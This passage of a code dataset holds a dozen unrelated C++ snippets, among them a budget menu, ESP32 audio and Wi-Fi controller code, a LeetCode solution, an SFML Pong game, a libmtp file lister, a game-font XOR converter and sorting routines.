std::cin >> name;\n                    std::cout << \"Enter the cost of the fix cost: \";\n                    std::cin >> cost;\n                    addFixCost(fixCosts, name, cost);\n                    break;\n                }\n                case 2: {\n                    std::string name;\n                    std::cout << \"Enter the name of the fix cost you want to remove: \";\n                    std::cin >> name;\n                    removeFixCost(fixCosts, name);\n                    break;\n                }\n                case 3: {\n                    displayFixCosts(fixCosts);\n                    break;\n                }\n                case 4: {\n                    double income;\n                    std::cout << \"Enter your new income: \";\n                    std::cin >> income;\n                    // Einkommen aktualisieren (noch nicht implementiert)\n                    break;\n                }\n                case 5: {\n                    std::string name;\n                    double cost;\n                    std::cout << \"Enter the name of the fix cost you want to edit: \";\n                    std::cin >> name;\n                    std::cout << \"Enter the new cost of the fix cost: \";\n                    std::cin >> cost;\n                    editFixCost(fixCosts, name, cost);\n                    break;\n                }\n                case 6: {\n                    std::cout << \"The total fix costs are: \" << calculateFixCosts(fixCosts) << std::endl;\n                    break;\n                }\n                case 0: {\n                    backToMain = true; // Zur\u00fcck ins Hauptmen\u00fc\n                    break;\n                }\n                default:\n                    std::cout << \"Invalid choice. Please try again.\\n\";\n                 ",
    "\n#include \"controller.h\"\n\n#include <Arduino.h>\n#include <EasyLogger.h>\n\n#include \"acr.h\"\n#include \"audio.h\"\n#include \"network.h\"\n#include \"screen.h\"\n#include \"secrets.h\"\n#include \"storage.h\"\n#include \"wav.h\"\n\n#define LABEL \"Controller\"\n\nint vprintfSerial(const char* fmt, va_list args) {\n  char log_print_buffer[256];\n  vsprintf(log_print_buffer, fmt, args);\n\n  Serial.print(log_print_buffer);\n\n  return 0;\n}\n\nvoid initLogging() {\n  Wire.begin();\n  Serial.begin(115200);\n\n  esp_log_set_vprintf(vprintfSerial);\n  esp_log_level_set(\"*\", ESP_LOG_DEBUG);\n\n  Serial.setDebugOutput(true);\n\n  while (!Serial) {\n    delay(10);\n  }\n\n  LOG_INFO(LABEL, \"Logging ready\");\n}\n\nvoid initAll() {\n  initStorage();\n  initButtons();\n  initScreen();\n  allocateWavSpace();\n  initAudio();\n  // initWifi();\n}\n\nTaskHandle_t taskHandle0;\nTaskHandle_t taskHandle1;\n\n// void recordWavAndSend(bool local) {\n//   recordWavAtRate(16000);\n//   identifySongV2(getWavData(), getWavFileSize(), local);\n// }\n\nvoid recordWavAndSend(void* params) {\n  initWifi();\n  // recordWavAtRate(16000);\n  recordWavFromI2S();\n  connectToSavedWifi();\n  identifySongV2(getWavData(), getWavFileSize(), true);\n  for (;;) delay(1000);\n}\n\nvoid runTask(TaskFunction_t task, int core) {\n  xTaskCreatePinnedToCore(task, \"Task1\", 10000, NULL, 1, core == 0 ? &taskHandle0 : &taskHandle1,\n                          core);\n}\n\nvoid runWavTask() { runTask(recordWavAndSend, 1); }\n\nvoid persistWifiCredentials(String ssid, String password) {\n  writeToStorage(WIFI_SSID_KEY, ssid);\n  writeToStorage(WIFI_PASSWORD_KEY, password);\n}\n\nvoid connectToSavedWifi(bool connect) {\n  if (isWifiConnected()) {\n    return;\n  }\n\n#ifdef WIFI_SSID\n  connectToWifi(WIFI_SSID, WIFI_PASSWORD, connect);\n  return;\n#endif\n\n  String ssid = readFromStorage(WIFI_SSID_KEY);\n  if (!ssid || ssid == \"\") {\n    return;\n  }\n\n  String password = readFromStorage(WIFI_PASSWORD_KEY);\n  if (!password || password == \"\") {\n    return;\n  }\n\n  connectToWifi(ssid.c_str(), password.c_str(), connect);\n  if (connect) {\n    persistWifiCredentials(ssid, password);\n  }\n}",
    "/*\n * @lc app=leetcode id=1836 lang=cpp\n * @lcpr version=20004\n *\n * [1836] Remove Duplicates From an Unsorted Linked List\n *\n * https://leetcode.com/problems/remove-duplicates-from-an-unsorted-linked-list/description/\n *\n * algorithms\n * Medium (75.06%)\n * Likes:    400\n * Dislikes: 12\n * Total Accepted:    37K\n * Total Submissions: 49.3K\n * Testcase Example:  '[1,2,3,2]'\n *\n * Given the head of a linked list, find all the values that appear more than\n * once in the list and delete the nodes that have any of those values.\n * \n * Return the linked list after the deletions.\n * \n * \n * Example 1:\n * \n * Input: head = [1,2,3,2]\n * Output: [1,3]\n * Explanation: 2 appears twice in the linked list, so all 2's should be\n * deleted. After deleting all 2's, we are left with [1,3].\n * \n * \n * Example 2:\n * \n * Input: head = [2,1,1,2]\n * Output: []\n * Explanation: 2 and 1 both appear twice. All the elements should be\n * deleted.\n * \n * \n * Example 3:\n * \n * Input: head = [3,2,2,1,3,2,4]\n * Output: [1,4]\n * Explanation: 3 appears twice and 2 appears three times. After deleting all\n * 3's and 2's, we are left with [1,4].\n * \n * \n * \n * Constraints:\n * \n * \n * The number of nodes in the list is in the range\u00a0[1, 10^5]\n * 1 <= Node.val <= 10^5\n * \n */\n\n\n// @lcpr-template-start\nusing namespace std;\n#include <algorithm>\n#include <array>\n#include <bitset>\n#include <climits>\n#include <deque>\n#include <functional>\n#include <iostream>\n#include <list>\n#include <queue>\n#include <stack>\n#include <tuple>\n#include <unordered_map>\n#include <unordered_set>\n#include <utility>\n#include <vector>\n// @lcpr-template-end\n// @lc code=start\n/**\n * Definition for singly-linked list.\n * struct ListNode {\n *     int val;\n *     ListNode *next;\n *     ListNode() : val(0), next(nullptr) {}\n *     ListNode(int x) : val(x), next(nullptr) {}\n *     ListNode(int x, ListNode *next) : val(x), next(next) {}\n * };\n */\nclass Solution {\npublic:\n    ListNode* deleteDuplicatesUnsorted(ListNode* head) {\n        unordered_map<int,int> s;\n        auto temp = head;\n        while(temp!= nullptr){\n            s[temp->val]++;\n            temp = temp->next;\n        }\n        ListNode* d = new ListNode();\n        auto dummy = d;\n        while(head != nullptr){\n            if(s[head->val] == 1){\n                dummy->next = head;\n                dummy = dummy->next;\n            }\n            head = head->next;\n        }\n        dummy->next = nullptr;\n        return d->next;\n    }\n};\n// @lc code=end\n\n\n\n/*\n// @lcpr case=start\n// [1,2,3,2]\\n\n// @lcpr case=end\n\n// @lcpr case=start\n// [2,1,1,2]\\n\n// @lcpr case=end\n\n// @lcpr case=start\n// [3,2,2,1,3,2,4]\\n\n// @lcpr case=end\n\n */\n\n",
    "#include \"ui/context.hpp\"\n\n#include <chrono>\n#include <functional>\n#include <span>\n#include <stop_token>\n#include <thread>\n\n#include <QImage>\n\n#include \"utils/log.hpp\"\n\nnamespace verre::ui {\n\nContext::Context() {\n    render_thread_ = std::jthread{std::bind_front(&Context::render_thread, this)};\n}\n\nvoid Context::render_thread(const std::stop_token& stop_token) noexcept {\n    try {\n        core::Renderer::Result next_result = renderer_.render();\n        while (!stop_token.stop_requested()) {\n            core::Renderer::Result result = std::exchange(next_result, renderer_.render());\n            std::span<const uint64_t> image_data = result.get();\n            image_ = {reinterpret_cast<const uchar*>(image_data.data()), 100, 100, QImage::Format_RGBX64};\n            emit imageChanged();\n\n            std::this_thread::sleep_for(std::chrono::milliseconds{200});\n        }\n    }\n    catch (std::exception& ex) {\n        log::error(\"Render thread failed: {}\", ex.what());\n    }\n}\n\n}  // namespace verre::ui\n",
    "#include \"main.hpp\"\n\nint main()\n{\n\n\tball.setFillColor(sf::Color::Blue);\n\tball.setPosition(WIDTH / 4, HEIGHT / 2);\n\tball.setOrigin(ballRadius, ballRadius);\n\n\tboard.setPosition(boardPosX, boardPosY);\n\t//board.setFillColor(sf::Color(15,15,10));\n\tboard.setOutlineColor(sf::Color::Green);\n\t//board.setOutlineThickness(outlineThickness);\n\n\tboardLineTop.setPosition(boardPosX, 0);\n\tboardLineTop.setFillColor(sf::Color::Green);\n\n\tleftPlayer.setPosition(boardPosX+10, HEIGHT/2);\n\tleftPlayer.setFillColor(sf::Color::Blue);\n\tleftPlayer.setOutlineColor(outlinePlayerColor);\n\tleftPlayer.setOutlineThickness(outlineThickness/2);\n\n\trightPlayer.setPosition(WIDTH+boardPosX-(raquetWidth+10), HEIGHT/2);\n\trightPlayer.setFillColor(sf::Color::Red);\n\trightPlayer.setOutlineColor(outlinePlayerColor);\n\trightPlayer.setOutlineThickness(outlineThickness/2);\n\n\twhile (window.isOpen())\n    {\n\t\tsf::Event event;\n        while (window.pollEvent(event))\n        {\n            if (event.type == sf::Event::Closed)\n                window.close();\n\n\t\t\t//if (event.type == sf::Event::KeyPressed)\n\t\t\t//{\n\t\t\t\tif (sf::Keyboard::isKeyPressed(sf::Keyboard::Up))\n\t\t\t\t{\n\t\t\t\t\tsf::Vector2f pos = rightPlayer.getPosition();\n\t\t\t\t\tpos.y = std::max(0.f, pos.y - 10);\n\t\t\t\t\trightPlayer.setPosition(pos);\n\t\t\t\t}\n\t\t\t\t//if (event.key.code == sf::Keyboard::Down)\n\t\t\t\tif (sf::Keyboard::isKeyPressed(sf::Keyboard::Down))\n\t\t\t\t{\n\t\t\t\t\tsf::Vector2f pos = rightPlayer.getPosition();\n\t\t\t\t\tpos.y = std::min(WIN_HEIGHT - raquetHeight , pos.y + 10);\n\t\t\t\t\trightPlayer.setPosition(pos);\n\t\t\t\t}\n\t\t\t//}\n\n\t\t\t\t// left player move\n\t\t\t//if (event.type == sf::Event::KeyPressed)\n\t\t\t//{\n\t\t\t\t//if (event.key.code == sf::Keyboard::W)\n\t\t\t\tif (sf::Keyboard::isKeyPressed(sf::Keyboard::W))\n\t\t\t\t{\n\t\t\t\t\tsf::Vector2f pos = leftPlayer.getPosition();\n\t\t\t\t\tpos.y = std::max(0.f, pos.y - 10);\n\t\t\t\t\tleftPlayer.setPosition(pos);\n\t\t\t\t}\n\t\t\t\t//if (event.key.code == sf::Keyboard::Z)\n\t\t\t\tif (sf::Keyboard::isKeyPressed(sf::Keyboard::Z))\n\t\t\t\t{\n\t\t\t\t\tsf::Vector2f pos = leftPlayer.getPosition();\n\t\t\t\t\tpos.y = std::min(WIN_HEIGHT - raquetHeight , pos.y + 10);\n\t\t\t\t\tleftPlayer.setPosition(pos);\n\t\t\t\t}\n\t\t\t//}\n        }\n\n\t\tusleep(TIME_FRESH);\n\n\t\tball.move(ballDirection.x * ballVitesse, ballDirection.y *ballVitesse);\n\t\tif (ball.getPosition().y <= boardPosY || ball.getPosition().y + ballRadius >= boardPosY + HEIGHT)\n    \t\tballDirection.y *= -1;\n\n        window.clear(sf::Color::Black);\n        window.draw(board);\n        window.draw(leftPlayer);\n        window.draw(rightPlayer);\n        window.draw(boardLineTop);\n        window.draw(ball);\n        window.display();\n    }\n\n\tstd::cout << \"Pong Game!! \\n\";\n\treturn 0;\n}\n",
    "#include <cstring>\n#include <libmtp.h>\n#include <iostream>\n#include <string>\n#include <iomanip>\n\n// Function to print file details\nvoid print_file_details(LIBMTP_file_t* file) {\n    if (file->filename != nullptr) {\n        std::cout << \"File: \" << file->filename << \"\\n\";\n        std::cout << \"Size: \" << file->filesize << \" bytes\\n\";\n\n        // Convert timestamp to human-readable format\n        if (file->modificationdate != 0) {\n            time_t mod_time = file->modificationdate;\n            std::cout << \"Modification Date: \"\n                      << std::put_time(std::localtime(&mod_time), \"%Y-%m-%d %H:%M:%S\") << \"\\n\";\n        }\n        std::cout << \"-----------------------------------\\n\";\n    }\n}\n\n// Function to check if a file has the \".jpg\" extension (common for camera images)\nbool is_image(const char* filename) {\n    std::string name(filename);\n    auto pos = name.rfind(\".jpg\");\n    return pos != std::string::npos && pos == name.size() - 4;\n}\n\nint main() {\n    LIBMTP_mtpdevice_t* device;\n    LIBMTP_file_t* files;\n    LIBMTP_folder_t* folders;\n\n    // Initialize libmtp\n    LIBMTP_Init();\n\n    // Detect devices\n    device = LIBMTP_Get_First_Device();\n    if (device == nullptr) {\n        std::cerr << \"No MTP devices found.\\n\";\n        return 1;\n    }\n\n    // Retrieve device information\n    char* manufacturer = LIBMTP_Get_Manufacturername(device);\n    char* model = LIBMTP_Get_Modelname(device);\n\n    if (manufacturer != nullptr && model != nullptr) {\n        std::cout << \"Connected to device: \" << manufacturer << \" - \" << model << \"\\n\";\n    } else {\n        std::cerr << \"Failed to retrieve device information.\\n\";\n    }\n\n    // Get the list of all folders\n    folders = LIBMTP_Get_Folder_List(device);\n    if (folders == nullptr) {\n        std::cerr << \"Failed to retrieve folder listing.\\n\";\n        LIBMTP_Release_Device(device);\n        return 1;\n    }\n\n    // Search for the Camera folder\n    LIBMTP_folder_t* camera_folder = nullptr;\n\n    // We will now check each folder manually\n    if(folders != nullptr){\n    do{\n        // Check if the folder name contains \"Camera\" or \"DCIM\"\n        if (folders->name != nullptr) {\n            camera_folder = folders;\n            std::cout << \"Found Camera folder: \" << camera_folder->name << \"\\n\";\n            std::cout << \"Found Camera folder: \" << camera_folder->folder_id << \"\\n\";\n        }\n\n        // Move to the next folder manually (since there is no `next` pointer, we rely on this logic)\n        folders = folders->sibling;  // If `LIBMTP_folder_t` has a `child` pointer, use that to move to the next folder\n        std::cout << \"Is this DCIM folder ? -> \" << strcmp(folders->name, \"DCIM\") << \"\\n\";\n    }while(strcmp(folders->name,\"DCIM\"));\n    }\n\n    if (camera_folder == nullptr) {\n        std::cerr << \"Camera folder not found.\\n\";\n        LIBMTP_destroy_folder_t(folders);\n        LIBMTP_Release_Device(device);\n        return 1;\n    }\n\n\n    // Get files in the Camera folder (use the folder ID)\n    files = LIBMTP_Get_Filelisting(device);  // Pass the folder ID\n    if (files == nullptr) {\n        std::cerr << \"Failed to retrieve files for the Camera folder.\\n\";\n        LIBMTP_destroy_folder_t(folders);\n        LIBMTP_Release_Device(device);\n        return 1;\n    }\n\n    // Process each file in the folder\n    LIBMTP_file_t* current_file = files;\n    while (current_file != nullptr) {\n        if (is_image(current_file->filename)) {  // Filter only image files (e.g., .jpg)\n            print_file_details(current_file);\n        }\n        current_file = current_file->next;\n    }\n\n    // Clean up\n    LIBMTP_destroy_file_t(files);\n    LIBMTP_destroy_folder_t(folders);\n    LIBMTP_Release_Device(device);\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"uas\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//#include<iostream>\n//using namespace std;\n//\n//int main(){\n//\tint n, m;\n//\tcin>>n>>m;\n//\tint arry[n][m];\n//\n//\tfor(int i = 0; i<n ; i++){\n//\t\tfor(int j = 0 ; j<m; j++){\n//\t\t\tcin>>arry[i][j];\n//\t\t\t\n//\t\t}\n//\t}\n//\tcout<<\" matrix is \"<<endl;\n//\tfor(int i = 0; i<n ; i++){\n//\t\tfor(int j = 0 ; j<m; j++){\n//\t\t\tcout<<\" \"<<arry[i][j];\n//\t\t\t\n//\t\t}\n//\t\tcout<<endl;\n//\t}\n//\treturn 0;\n//}\n#include <iostream>\nusing namespace std;\n\nint main() {\n    int rows1, cols1, rows2, cols2;\n\n    // Input dimensions of the first matrix\n    cout << \"Input Rows and Columns of the 1st matrix: \";\n    cin >> rows1 >> cols1;\n\n    // Input dimensions of the second matrix\n    cout << \"Input Rows and Columns of the 2nd matrix: \";\n    cin >> rows2 >> cols2;\n\n    // Check if dimensions match\n    if (rows1 != rows2 || cols1 != cols2) {\n        cout << \"The Matrices cannot be compared as their dimensions are not the same.\" << endl;\n        return 0;\n    }\n\n    // Define the 2D arrays with a fixed maximum size\n    const int MAX = 100;\n    int matrix1[MAX][MAX];\n    int matrix2[MAX][MAX];\n\n    // Input elements for the first matrix\n    cout << \"Input elements in the first matrix:\" << endl;\n    for (int i = 0; i < rows1; i++) {\n        for (int j = 0; j < cols1; j++) {\n            cout << \"element - [\" << i << \"],[\" << j << \"] : \";\n            cin >> matrix1[i][j];\n        }\n    }\n\n    // Input elements for the second matrix\n    cout << \"Input elements in the second matrix:\" << endl;\n    for (int i = 0; i < rows2; i++) {\n        for (int j = 0; j < cols2; j++) {\n            cout << \"element - [\" << i << \"],[\" << j << \"] : \";\n            cin >> matrix2[i][j];\n        }\n    }\n\n    // Display the first matrix\n    cout << \"The first matrix is:\" << endl;\n    for (int i = 0; i < rows1; i++) {\n        for (int j = 0; j < cols1; j++) {\n            cout << matrix1[i][j] << \" \";\n        }\n        cout << endl;\n    }\n\n    // Display the second matrix\n    cout << \"The second matrix is:\" << endl;\n    for (int i = 0; i < rows2; i++) {\n        for (int j = 0; j < cols2; j++) {\n            cout << matrix2[i][j] << \" \";\n        }\n        cout << endl;\n    }\n\n    // Compare the matrices\n    bool areEqual = true;\n    for (int i = 0; i < rows1 && areEqual; i++) {\n        for (int j = 0; j < cols1; j++) {\n            if (matrix1[i][j] != matrix2[i][j]) {\n                areEqual = false;\n                break;\n            }\n        }\n    }\n\n    // Display the result\n    cout << \"The Matrices can be compared:\" << endl;\n    if (areEqual) {\n        cout << \"Two matrices are equal.\" << endl;\n    } else {\n        cout << \"Two matrices are not equal.\" << endl;\n    }\n\n    return 0;\n}\n",
    "#include \"Font.h\"\n\n#include <filesystem>\n#include <fstream>\n#include <print>\n#include <span>\n#include <vector>\n\n#define check_magic(data, magic) (std::memcmp(data, magic, 4) == 0)\n\n\ntemplate<typename T>\nT read(std::ifstream& file) {\n    T value;\n    file.read(reinterpret_cast<char*>(&value), sizeof(T));\n    return value;\n}\n\nvoid read(std::ifstream& file, std::span<uint8_t> buffer) {\n    file.read(reinterpret_cast<char*>(buffer.data()), buffer.size());\n}\n\nvoid process_outline_font(std::ifstream& file, const FontHeader& header, const std::filesystem::path& file_path);\nvoid generate_outline_font(std::ifstream& file, const std::filesystem::path& file_path);\n\nint main(int argc, char** argv) {\n    if (argc < 2) {\n        std::println(\"MHW Font Util 1.0 by Fexty\");\n        std::println(\"Converts between GFD and TTF/OTF font files.\");\n        std::println(\"  Usage: {} <font_file>\", argv[0]);\n        std::println(\"Note: Texture based fonts are not supported.\");\n        return 1;\n    }\n\n    const std::filesystem::path font_file = argv[1];\n    std::ifstream file(font_file, std::ios::binary | std::ios::in);\n\n    if (font_file.extension() == \".otf\" || font_file.extension() == \".ttf\") {\n        generate_outline_font(file, font_file);\n        return 0;\n    }\n\n    const auto header = read<FontHeader>(file);\n    if (!check_magic(header.magic, \"GFD\\0\")) {\n        std::println(\"Invalid font file: {}\", header.magic);\n        return 1;\n    }\n\n    if (header.version != 135432) {\n        std::println(\"Unsupported font version: {}\", header.version);\n        return 1;\n    }\n\n    if (header.type != FontType::Outlined) {\n        std::println(\"Unsupported font type: {}\", static_cast<int>(header.type));\n        return 1;\n    }\n\n    process_outline_font(file, header, font_file);\n\n    return 0;\n}\n\nvoid xor_crypt(std::span<uint8_t> buffer) {\n    uint64_t n = 1;\n    const uint32_t len3f = buffer.size() & 0x3F;\n    for (uint32_t i = 0; i < len3f; ++i) {\n        n = (n << 1) + 1;\n    }\n\n    n = (n & 0xae6e39b58a355f45) << (0x40U - len3f) | 0xae6e39b58a355f45U >> len3f;\n\n    const auto xor_key = (uint8_t*)&n;\n    const auto ptr = buffer.data();\n\n    for (uint32_t j = 0; j < buffer.size(); ++j) {\n        ptr[j] = ptr[j] ^ xor_key[j % 8];\n    }\n}\n\nvoid process_outline_font(std::ifstream& file, const FontHeader& header, const std::filesystem::path& file_path) {\n    if (header.attr & 1 || header.texture_count != 0) {\n        std::println(\"Outline Font not suitable for processing.\");\n        return;\n    }\n\n    file.seekg(header.descent_count * sizeof(float), std::ios::cur); // Skip descent data\n\n    const auto tex_path_size = read<uint32_t>(file);\n    file.seekg(tex_path_size + 1, std::ios::cur); // Skip texture path\n\n    if (!(header.attr >> 3 & 1) && header.texture_count != 0) {\n        for (uint32_t i = 0; i < header.texture_count; ++i) {\n            const auto tex_name_size = read<uint32_t>(file);\n            file.seekg(tex_name_size + 1, std::ios::cur); // Skip texture name\n        }\n    }\n\n    file.seekg((header.char_count + header.unk0) * 0x14LL, std::ios::cur); // Skip character data\n\n    read<uint32_t>(file); // f0\n    read<uint32_t>(file); // f4\n    const auto buffer_size = read<uint32_t>(file);\n\n    std::println(\"Starting font processing at offset: 0x{:X}\", (uint64_t)file.tellg());\n    std::println(\"Buffer size: {}\", buffer_size);\n\n    std::vector<uint8_t> buffer(buffer_size);\n    read(file, buffer);\n\n    xor_crypt(buffer);\n\n    const auto extension = check_magic(buffer.data(), \"OTTO\") ? \".otf\" : \".ttf\";\n\n    auto out_file = file_path;\n    out_file.replace_filename(out_file.stem().string() + extension);\n    std::ofstream out(out_file, std::ios::binary | std::ios::out);\n    out.write(reinterpret_cast<char*>(buffer.data()), buffer.size());\n\n    std::println(\"Font processed successfully. Output file: {}\", out_file.string());\n}\n\nvoid generate_outline_font(std::ifstream& file, const std::filesystem::path& file_path) {\n    const auto write = [](std::ofstream& out, const auto& value) {\n        out.write(reinterpret_cast<const char*>(&value), sizeof(value));\n    };\n    const auto write_buf = [](std::ofstream& out, std::span<const uint8_t> buffer) {\n        out.write(reinterpret_cast<const char*>(buffer.data()), buffer.size());\n    };\n\n    FontHeader header{};\n    header.magic[0] = 'G';\n    header.magic[1] = 'F';\n    header.magic[2] = 'D';\n    header.magic[3] = '\\0';\n\n    header.version = 135432;\n    header.attr = 12;\n    header.suffix = TexSuffix::ID_HQ;\n    header.type = FontType::Outlined;\n    header.size = 32;\n    header.texture_count = 0;\n    header.char_count = 0;\n    header.unk0 = 0;\n    header.descent_count = 0;\n    header.max_ascent = 32.384f;\n    header.max_descent = 32.7f;\n    header.unk1 = 12.128f;\n\n    std::vector<uint8_t> buffer(std::filesystem::file_size(file_path));\n    read(file, buffer);\n    xor_crypt(buffer);\n\n    auto out_file = file_path;\n    out_file.replace_filename(out_file.stem().string() + \".gfd\");\n    std::ofstream out",
    "#include \"chartdir.h\"\n\nvoid createChart(int chartIndex, const char *filename)\n{\n    // The value to display on the meter\n    double value = 4.75;\n\n    // Create an AugularMeter object of size 110 x 110 pixels, using silver background color with a\n    // black 2 pixel 3D depressed border.\n    AngularMeter *m = new AngularMeter(110, 110, Chart::silverColor(), 0x000000, -2);\n\n    // Set meter appearance according to a parameter\n    if (chartIndex == 0) {\n        // Set the meter center at bottom left corner (15, 95), with radius 85 pixels. Meter spans\n        // from 90 - 0 degrees.\n        m->setMeter(15, 95, 85, 90, 0);\n        // Add a label to the meter centered at (35, 75)\n        m->addText(35, 75, \"VDC\", \"arialbd.ttf\", 12, Chart::TextColor, Chart::Center);\n        // Add a text box to show the value at top right corner (103, 7)\n        m->addText(103, 7, m->formatValue(value, \"2\"), \"arial.ttf\", 8, 0xffffff, Chart::TopRight\n            )->setBackground(0, 0, -1);\n    } else if (chartIndex == 1) {\n        // Set the meter center at top left corner (15, 15), with radius 85 pixels. Meter spans from\n        // 90 - 180 degrees.\n        m->setMeter(15, 15, 85, 90, 180);\n        // Add a label to the meter centered at (35, 35)\n        m->addText(35, 35, \"AMP\", \"arialbd.ttf\", 12, Chart::TextColor, Chart::Center);\n        // Add a text box to show the value at bottom right corner (103, 103)\n        m->addText(103, 103, m->formatValue(value, \"2\"), \"arial.ttf\", 8, 0xffffff,\n            Chart::BottomRight)->setBackground(0, 0, -1);\n    } else if (chartIndex == 2) {\n        // Set the meter center at top right corner (15, 95), with radius 85 pixels. Meter spans\n        // from 270 - 180 degrees.\n        m->setMeter(95, 15, 85, 270, 180);\n        // Add a label to the meter centered at (75, 35)\n        m->addText(75, 35, \"KW\", \"arialbd.ttf\", 12, Chart::TextColor, Chart::Center);\n        // Add a text box to show the value at bottom left corner (7, 103)\n        m->addText(7, 103, m->formatValue(value, \"2\"), \"arial.ttf\", 8, 0xffffff, Chart::BottomLeft\n            )->setBackground(0, 0, -1);\n    } else {\n        // Set the meter center at bottom right corner (95, 95), with radius 85 pixels. Meter spans\n        // from 270 - 360 degrees.\n        m->setMeter(95, 95, 85, 270, 360);\n        // Add a label to the meter centered at (75, 75)\n        m->addText(75, 75, \"RPM\", \"arialbd.ttf\", 12, Chart::TextColor, Chart::Center);\n        // Add a text box to show the value at top left corner (7, 7)\n        m->addText(7, 7, m->formatValue(value, \"2\"), \"arial.ttf\", 8, 0xffffff, Chart::TopLeft\n            )->setBackground(0, 0, -1);\n    }\n\n    // Meter scale is 0 - 10, with a major tick every 2 units, and minor tick every 1 unit\n    m->setScale(0, 10, 2, 1);\n\n    // Set 0 - 6 as green (99ff99) zone, 6 - 8 as yellow (ffff00) zone, and 8 - 10 as red (ff3333)\n    // zone\n    m->addZone(0, 6, 0x99ff99, 0x808080);\n    m->addZone(6, 8, 0xffff00, 0x808080);\n    m->addZone(8, 10, 0xff3333, 0x808080);\n\n    // Add a semi-transparent black (80000000) pointer at the specified value\n    m->addPointer(value, 0x80000000);\n\n    // Output the chart\n    m->makeChart(filename);\n\n    //free up resources\n    delete m;\n}\n\nint main(int argc, char *argv[])\n{\n    createChart(0, \"squareameter0.png\");\n    createChart(1, \"squareameter1.png\");\n    createChart(2, \"squareameter2.png\");\n    createChart(3, \"squareameter3.png\");\n    return 0;\n}\n\n",
    "#include <vector>\n\n#include \"Algorithms.h\"\n\nvoid Algorithms::bubble_sort(std::vector<int>& arr)\n{\n    bool swapped = false;\n    for(int i = 0; i<arr.size(); i++){\n        for(int j = 0; j<arr.size()-i-1;j++){\n            if(arr[j]>arr[j+1]){\n                int temp = arr[j];\n                arr[j] = arr[j+1];\n                arr[j+1] = temp;\n                swapped = true;\n                \n            }\n        }\n        if(!swapped){\n            break;\n        }\n    }\n\n}\n\nvoid Algorithms::insertion_sort(std::vector<int>& arr)\n{\n    for(int i  = 1;i<arr.size();i++)\n    {\n        int compared = arr[i];\n        int j = i-1;\n\n        while (j>=0 && compared < arr[j])\n        {\n            arr[j+1] = arr[j];\n            j--;\n        }\n        arr[j+1] = compared;\n    }\n    }\n\nvoid Algorithms::selection_sort(std::vector<int>& arr)\n{\n    for(int i = 0;i<arr.size()-1;i++)\n    {\n        int cur_min = i;\n        for(int j = i+1;j<arr.size();j++)\n        {\n            if (arr[j]<arr[cur_min])\n            {\n                cur_min = j; \n            }\n        }\n        std::swap(arr[i],arr[cur_min]);\n    }\n}\n\nvoid Algorithms::merge(std::vector<int>& arr, int left, int mid, int right)\n{\n    int i, j, k;\n    int n1 = mid - left + 1;\n    int n2 = right - mid;\n\n    std::vector<int> leftVec(n1), rightVec(n2);\n\n    for (i = 0; i < n1; i++)\n        leftVec[i] = arr[left + i];\n    for (j = 0; j < n2; j++)\n        rightVec[j] = arr[mid + 1 + j];\n\n    i = 0, j = 0, k = left;\n\n    while (i < n1 && j < n2) {\n        if (leftVec[i] <= rightVec[j]) {\n            arr[k] = leftVec[i];\n            i++;\n        } else {\n            arr[k] = rightVec[j];\n            j++;\n        }\n        k++;\n    }\n    \n    while (i < n1) {\n        arr[k] = leftVec[i];\n        i++;\n        k++;\n    }\n\n    while (j < n2) {\n        arr[k] = rightVec[j];\n        j++;\n        k++;\n    }\n}\n\nvoid Algorithms::merge_sort(std::vector<int>& arr, int left, int right)\n{\n    if (left < right)\n    {\n        int mid = left + (right - left) / 2;\n\n        merge_sort(arr, left, mid);\n        merge_sort(arr, mid + 1, right);\n        \n        merge(arr, left, mid, right);\n    }\n}\n\nint Algorithms::swap(int& a, int& b)\n{\n    a = a ^ b;\n    b = a ^ b;\n    a = a ^ b;\n}\n\nint Algorithms::partition(std::vector<int>& arr, int low, int high)\n{\n    int pivot = arr[high];\n    int i = (low -1);\n\n    for (int j = low; j <= high; j++)\n    {\n        if (arr[j] <= pivot) {\n            i++;\n            swap(arr[i], arr[j]);\n        }\n    }\n\n    swap(arr[i + 1], arr[high]);\n\n    return i + 1;\n}\n\nvoid Algorithms::quick_sort(std::vector<int>& arr, int low, int high)\n{\n    if (low < high)\n    {\n        int pi = partition(arr, low, high);\n\n        quick_sort(arr, low, pi - 1);\n        quick_sort(arr, pi + 1, high);\n    }\n}",
    "#include <iostream>\n#include <dlfcn.h>\n#include <cxxabi.h>\n#include <fstream>\n\n#include \"../fiya-time-measure.h\"\n\nusing namespace fiya;\n\nint main(int argc, char **argv);\n\n/** My recorder type. For label we use function address.\n *  which is void* and forwarded to __cyg_profile_func_enter\n *  and __cyg_profile_func_exit functions.\n */\nthread_local cyg_measure_time_t<void*>::recorder_type my_recorder({}, nullptr, time_value_t::now());\n\n/** Helper class for the cyg profiling. */\nthread_local cyg_measure_time_t<void*> my_measure_time(&my_recorder);\n\n/** Provided for functions in fiya-cyg-overloads.cpp */\nextern fiya::scoping_interface_t<void*> * get_recorder() {\n    return &my_measure_time;\n}\n\nvoid busy_wait(int64_t v) {\n    int64_t num = v * 1000000;\n    while (num--) (void) rand();\n}\n\n/** \n *  Test functions. Notice the lack of any\n *  marker API. The compiler automaticallly inserts\n *  call to __cyg_profile_func_enter on entering\n *  function and __cyg_profile_func_exit when\n *  leaving.\n */\nvoid func4() {\n    busy_wait(1);\n}\n\nvoid func3() {\n    busy_wait(10);\n    func4();\n    